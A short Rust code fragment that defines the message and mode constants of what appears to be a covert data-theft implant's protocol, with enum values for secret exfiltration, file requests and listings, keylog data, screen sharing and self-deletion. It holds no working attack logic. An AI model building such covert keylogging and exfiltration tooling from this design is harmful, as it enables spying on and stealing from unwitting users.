#[repr(u8)]
#[allow(unused)]
pub enum ExiltrationMode {
    ModeDisabled = 0b11101110,
    ModeSecret = 0b10111011,
    ModeFast = 0b10101011,
}

#[repr(u8)]
#[allow(unused)]
pub enum SectionType {
    ExfiltrationMode = 0b10110110,
    ExFileReq = 0b00100111,
    ExFile = 0b01100100,
    ExFileList = 0b10100100,
    ExKeylogCard = 0b10110101,
    ExScreenShare = 0b11001100,
    ExSelfDelete = 0b11001111,
}
